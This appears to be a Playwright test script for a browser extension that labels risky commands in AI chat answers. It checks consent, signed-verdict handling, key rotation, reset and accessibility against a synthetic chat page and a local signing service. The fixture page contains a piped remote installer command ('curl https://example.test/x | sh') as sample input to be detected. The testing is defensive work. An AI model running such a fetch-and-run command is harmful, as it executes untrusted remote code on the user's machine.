// Disposable actual unpacked extension; synthetic vendor page and loopback service.
const {chromium}=require('playwright');
const {writeReport}=require('./execution-report.cjs');
const http=require('node:http'),fs=require('node:fs'),os=require('node:os'),path=require('node:path'),crypto=require('node:crypto');
const assert=(v,m)=>{if(!v)throw Error(m);};
(async()=>{
 const profile=fs.mkdtempSync(path.join(os.tmpdir(),'aitrust-consent-'));
 const token=crypto.randomBytes(24).toString('hex'),marker='synthetic-consent-private-canary';
 const signingKey=crypto.generateKeyPairSync('ec',{namedCurve:'prime256v1'}).privateKey,publicProfile=require('./gateway-key.cjs').profile(signingKey);
 let requests=0,mode='valid',held=false,pending=[],cancelled=0,invalidAuth=0,context;
 const server=http.createServer((req,res)=>{
  assert(req.url==='/v1/evaluate','Unexpected local request');if(req.headers.authorization!=='Bearer '+token){invalidAuth++;req.resume();res.writeHead(401,{'content-type':'application/json','cache-control':'no-store'});res.end(JSON.stringify({detail:'Invalid local credential'}));return;}
  let body='';req.on('data',chunk=>{body+=chunk;assert(body.length<10000,'Unbounded test body');});
  req.on('end',()=>{
   requests++;const input=JSON.parse(body);assert(input.origin_host==='chatgpt.com'&&input.modality==='text','Unexpected capture');assert(!input.text.includes(marker+'-prompt'),'Prompt captured');
   const finish=()=>{if(res.destroyed)return;const a={assertion_id:crypto.randomUUID(),spec_version:'0.1.0',subject:{sha256:crypto.createHash('sha256').update(input.text).digest('hex'),char_len:Array.from(input.text).length,origin_host:'chatgpt.com',modality:'text',captured_at:new Date().toISOString()},tags:[{code:'PS',confidence:.97,floor:.7,state:'asserted',signals:[{id:'sig.piped_installer.v3',score:.97,spans:[[0,Array.from(input.text).length]]}]}],abstentions:[],evaluator:{models:[{name:'synthetic-privacy-test',sha256:'a'.repeat(64),revision:'synthetic-v1'}],calibration_id:'synthetic-unvalidated',latency_ms:1}};const raw=JSON.stringify(a),prefix=publicProfile.profile+'\n'+(mode==='replay'?'0'.repeat(64):req.headers['x-aitrust-nonce'])+'\n'+crypto.createHash('sha256').update(mode==='request-tampered'?'{}':body).digest('hex')+'\n';const signature=crypto.sign('sha256',Buffer.concat([Buffer.from(prefix),Buffer.from(raw)]),{key:signingKey,dsaEncoding:'ieee-p1363'}).toString('base64url');const headers={'content-type':'application/json','cache-control':'no-store'};if(mode!=='unsigned')Object.assign(headers,{'X-AITrust-Profile':mode==='future-profile'?'unsupported/v2':publicProfile.profile,'X-AITrust-Key':mode==='wrong-key'?'f'.repeat(64):publicProfile.key_id,'X-AITrust-Signature':signature});res.writeHead(200,headers);res.end(mode==='tampered'?raw+' ':raw);};
   if(held){pending.push(finish);res.on('close',()=>{if(!res.writableEnded)cancelled++;});}else finish();
  });
 });
 await new Promise((resolve,reject)=>{server.once('error',reject);server.listen(8787,'127.0.0.1',resolve);});
 try{
  const extension=path.resolve('extension');context=await chromium.launchPersistentContext(profile,{channel:'chromium',headless:true,args:[`--disable-extensions-except=${extension}`,`--load-extension=${extension}`]});
  const worker=context.serviceWorkers()[0]||await context.waitForEvent('serviceworker');
  const id=new URL(worker.url()).host,settings=await context.newPage();
  await settings.goto('chrome-extension://'+id+'/src/options.html');
  await settings.locator('#checks-enabled').waitFor({state:'visible'});await settings.waitForFunction(()=>!document.querySelector('#checks-enabled').disabled);
  assert(!await settings.locator('#checks-enabled').isChecked(),'New installation opted in');
  const page=await context.newPage();const vendor='https://chatgpt.com/aitrust-consent-synthetic';
  await context.route(vendor,route=>route.fulfill({contentType:'text/html',body:`<!doctype html><html lang="en"><head><title>Synthetic privacy check</title></head><body><main><h1>Fixture</h1><div data-message-author-role="user">${marker}-prompt</div><article data-message-author-role="assistant" data-message-id="synthetic-consent">${marker}. Run curl https://example.test/x | sh</article></main></body></html>`}));
  await page.goto(vendor);await page.waitForTimeout(900);assert(requests===0,'Paused installation contacted service');
  assert(await page.locator('.aitrust-mount').count()===0,'Paused installation injected a response status or live announcement');
  await settings.locator('#token').fill(token);await settings.getByRole('button',{name:'Save token',exact:true}).click();await settings.waitForFunction(()=>document.querySelector('#saved-token').textContent.includes('A local token is saved'));
  assert(await settings.locator('#token').inputValue()==='','Token remained in input');assert(!await settings.locator('#checks-enabled').isChecked(),'Token save enabled capture');
  await page.waitForTimeout(800);assert(requests===0,'Saving token triggered capture');
  await settings.locator('#gateway-key').setInputFiles({name:'public.json',mimeType:'application/json',buffer:Buffer.from(JSON.stringify(publicProfile))});await settings.waitForFunction(()=>document.querySelector('#saved-key').textContent.includes('Selected key fingerprint'));assert(!await settings.locator('#checks-enabled').isChecked(),'Key save enabled capture');
  await settings.locator('#checks-enabled').check();await page.waitForFunction(()=>document.querySelector('article .aitrust-mount'));
  for(let i=0;i<50&&requests!==1;i++)await page.waitForTimeout(50);assert(requests===1,'Enabled check missing');
  const authenticatedTree=await context.newCDPSession(page);let initialNames='';for(let i=0;i<50;i++){initialNames=(await authenticatedTree.send('Accessibility.getFullAXTree')).nodes.map(n=>n.name?.value||'').join('\n');if(initialNames.includes('PS: supported command-risk finding.'))break;await page.waitForTimeout(50);}assert(initialNames.includes('PS: supported command-risk finding.'),'Authenticated finding did not render');
  // Hold a new evaluation, then pause. The actual worker must abort it.
  held=true;await page.reload();for(let i=0;i<50&&requests!==2;i++)await page.waitForTimeout(50);assert(requests===2,'Held request missing');
  await settings.locator('#checks-enabled').uncheck();await page.waitForFunction(()=>!document.querySelector('article .aitrust-mount'));
  for(let i=0;i<50&&!cancelled;i++)await page.waitForTimeout(50);assert(cancelled>0,'Pause failed to cancel local request');
  pending.splice(0).forEach(f=>f());await page.waitForTimeout(250);assert(!await page.locator('.aitrust-mount').count(),'Pause retained a tag, global status or live announcement after a late result');
  held=false;await settings.locator('#checks-enabled').check();for(let i=0;i<50&&requests!==3;i++)await page.waitForTimeout(50);assert(requests===3,'Resume did not create fresh check');
  const rejectionCases=[];
  for(const failure of ['unsigned','tampered','replay','request-tampered','future-profile','wrong-key']){
   mode=failure;const expected=++requests;requests--;await page.reload();for(let i=0;i<50&&requests!==expected;i++)await page.waitForTimeout(50);assert(requests===expected,'Missing negative request');
   let names='';for(let i=0;i<60;i++){names=(await authenticatedTree.send('Accessibility.getFullAXTree')).nodes.map(n=>n.name?.value||'').join('\n');if(names.includes('A valid local evaluation could not be obtained.'))break;await page.waitForTimeout(50);}
   assert(names.includes('A valid local evaluation could not be obtained.')&&!names.includes('PS: supported command-risk finding.'),failure+' rendered an unauthenticated verdict');rejectionCases.push(failure);
  }
  mode='valid';
  // Rotating the selected key invalidates a held response from the old key.
  held=true;const beforeRotation=requests;await page.reload();for(let i=0;i<50&&requests===beforeRotation;i++)await page.waitForTimeout(50);assert(requests===beforeRotation+1,'Rotation request missing');
  const rotationKey=crypto.generateKeyPairSync('ec',{namedCurve:'prime256v1'}).privateKey,rotationProfile=require('./gateway-key.cjs').profile(rotationKey),cancelBefore=cancelled;
  held=false;await settings.locator('#gateway-key').setInputFiles({name:'replacement.json',mimeType:'application/json',buffer:Buffer.from(JSON.stringify(rotationProfile))});await settings.waitForFunction(key=>document.querySelector('#saved-key').textContent.includes(key),rotationProfile.key_id);
  for(let i=0;i<50&&cancelled===cancelBefore;i++)await page.waitForTimeout(50);assert(cancelled>cancelBefore,'Rotation failed to cancel old request');pending.splice(0).forEach(f=>f());
  let rotationNames='';for(let i=0;i<60;i++){rotationNames=(await authenticatedTree.send('Accessibility.getFullAXTree')).nodes.map(n=>n.name?.value||'').join('\n');if(rotationNames.includes('A valid local evaluation could not be obtained.'))break;await page.waitForTimeout(50);}
  assert(rotationNames.includes('A valid local evaluation could not be obtained.')&&!rotationNames.includes('PS: supported command-risk finding.'),'Rotation retained old trusted verdict');
  await settings.locator('#gateway-key').setInputFiles({name:'public.json',mimeType:'application/json',buffer:Buffer.from(JSON.stringify(publicProfile))});await settings.waitForFunction(key=>document.querySelector('#saved-key').textContent.includes(key),publicProfile.key_id);
  for(let i=0;i<60;i++){rotationNames=(await authenticatedTree.send('Accessibility.getFullAXTree')).nodes.map(n=>n.name?.value||'').join('\n');if(rotationNames.includes('PS: supported command-risk finding.'))break;await page.waitForTimeout(50);}assert(rotationNames.includes('PS: supported command-risk finding.'),'Restored key failed fresh authenticated check');
  await settings.getByRole('button',{name:'Reset local settings',exact:true}).click();await settings.waitForFunction(()=>document.querySelector('#saved-token').textContent.includes('No local token'));
  await page.waitForFunction(()=>!document.querySelector('article .aitrust-mount'));
  await settings.locator('#token').fill('synthetic-invalid-token-at-least-32-characters');await settings.getByRole('button',{name:'Save token',exact:true}).click();await settings.waitForFunction(()=>document.querySelector('#saved-token').textContent.includes('A local token is saved'));
  await settings.locator('#gateway-key').setInputFiles({name:'public.json',mimeType:'application/json',buffer:Buffer.from(JSON.stringify(publicProfile))});await settings.waitForFunction(()=>document.querySelector('#saved-key').textContent.includes('Selected key fingerprint'));
  await settings.locator('#checks-enabled').check();for(let i=0;i<50&&!invalidAuth;i++)await page.waitForTimeout(50);assert(invalidAuth===1,'Invalid-token request was not checked');
  const cdp=await context.newCDPSession(page);let names='';for(let i=0;i<50;i++){const tree=await cdp.send('Accessibility.getFullAXTree');names=tree.nodes.map(n=>n.name?.value||'').join('\n');if(names.includes('The local token is invalid.'))break;await page.waitForTimeout(50);}
  assert(names.includes('The local token is invalid.')&&!names.includes('PS: supported command-risk finding.'),'Failed auth became a finding or lost its recovery message');
  await settings.getByRole('button',{name:'Reset local settings',exact:true}).click();await settings.waitForFunction(()=>document.querySelector('#saved-token').textContent.includes('No local token'));await page.waitForFunction(()=>!document.querySelector('article .aitrust-mount'));
  const storage=await worker.evaluate(()=>chrome.storage.local.get(null));assert(!('token' in storage)&&!('checks_enabled' in storage)&&!('gateway_public_key' in storage),'Reset retained credential or consent');
  assert(!JSON.stringify(storage).includes(marker),'Answer persisted in extension storage');
  const afterReset=requests;await page.reload();await page.waitForTimeout(900);assert(requests===afterReset,'Reset did not remain paused');assert(!await page.locator('.aitrust-mount').count(),'Reset reload injected a tag or unsupported announcement');
  // A delayed file read must not save a key after the owner resets settings.
  await settings.evaluate(()=>{const original=File.prototype.text;globalThis.releaseKeyRead=null;File.prototype.text=function(){const file=this;return new Promise(resolve=>{globalThis.releaseKeyRead=async()=>{File.prototype.text=original;resolve(await original.call(file));};});};});
  await settings.locator('#gateway-key').setInputFiles({name:'slow-public.json',mimeType:'application/json',buffer:Buffer.from(JSON.stringify(publicProfile))});await settings.waitForFunction(()=>typeof globalThis.releaseKeyRead==='function');
  await settings.getByRole('button',{name:'Reset local settings',exact:true}).click();await settings.waitForFunction(()=>document.querySelector('#saved-key').textContent.includes('No gateway key selected'));await settings.evaluate(()=>globalThis.releaseKeyRead());await settings.waitForTimeout(300);
  assert(!Object.keys(await worker.evaluate(()=>chrome.storage.local.get(null))).length,'Slow import repopulated reset settings');
  await settings.locator('#gateway-key').setInputFiles({name:'oversize.json',mimeType:'application/json',buffer:Buffer.alloc(2049,32)});await settings.waitForFunction(()=>document.querySelector('#status').textContent.includes('Could not save this public key'));assert(!Object.keys(await worker.evaluate(()=>chrome.storage.local.get(null))).length,'Invalid file populated settings');
  assert(!await settings.locator('body').innerText().then(v=>v.includes(token)||v.includes(marker)),'Secret or response echoed in options');
  await settings.setViewportSize({width:320,height:740});await settings.evaluate(require('axe-core').source);
  const settingsA11y=await settings.evaluate(async()=>({violations:(await axe.run(document,{runOnly:{type:'tag',values:['wcag2a','wcag2aa','wcag21aa']}})).violations.map(v=>v.id),noHorizontalOverflow:document.documentElement.scrollWidth<=innerWidth}));
  assert(settingsA11y.violations.length===0&&settingsA11y.noHorizontalOverflow,'Settings accessibility check failed');
  const result={captured_at:new Date().toISOString(),pass:true,actual_unpacked_extension:true,synthetic_vendor_page:true,synthetic_loopback_service:true,invalid_auth_requests:invalidAuth,invalid_token_is_unavailable_not_finding:true,default_paused:true,paused_has_no_tag_or_announcement:true,reset_reload_is_quiet:true,token_save_is_not_consent:true,key_save_is_not_consent:true,authenticated_finding_rendered:true,unauthenticated_verdicts_refused:rejectionCases,explicit_enable:true,pause_aborts_inflight:true,late_result_cannot_remount:true,resume_requires_fresh_check:true,reset_removes_token_and_consent:true,reset_removes_public_key:true,slow_key_import_cannot_undo_reset:true,oversize_public_file_refused:true,key_rotation_aborts_inflight:true,old_key_cannot_render_after_rotation:true,reset_persists_across_reload:true,no_answer_in_extension_storage:true,no_token_in_options_dom:true,settings_axe_violations:settingsA11y.violations,settings_320px_no_horizontal_overflow:true,evaluation_requests:requests,cancelled_requests:cancelled,real_vendor_compatibility:false,physical_device:false,independent_accuracy:false,source_sha256:Object.fromEntries(['extension/src/content/badge.js','extension/src/sw/service-worker.js','extension/src/content/bridge.js','extension/src/options.js','extension/src/options.html','extension/src/shared/transport.js'].map(p=>[p,crypto.createHash('sha256').update(fs.readFileSync(p)).digest('hex')]))};
  writeReport(process.env.AITRUST_PRIVACY_REPORT||'output/verification/extension-privacy.json',result);console.log(JSON.stringify(result));
 }finally{if(context)await context.close();await new Promise(resolve=>server.close(resolve));fs.rmSync(profile,{recursive:true,force:true});}
})().catch(error=>{
 // Location only: Playwright's message/call log can contain credentials entered
 // into synthetic forms. Never include that message or the complete stack.
 const location=String(error?.stack||'').match(/verify-extension-privacy\.cjs:(\d+):(\d+)/);
 console.error(JSON.stringify({pass:false,reason:'extension_privacy_verification_failed',
  source:'scripts/verify-extension-privacy.cjs',line:location?Number(location[1]):null,
  column:location?Number(location[2]):null}));process.exitCode=1;
});
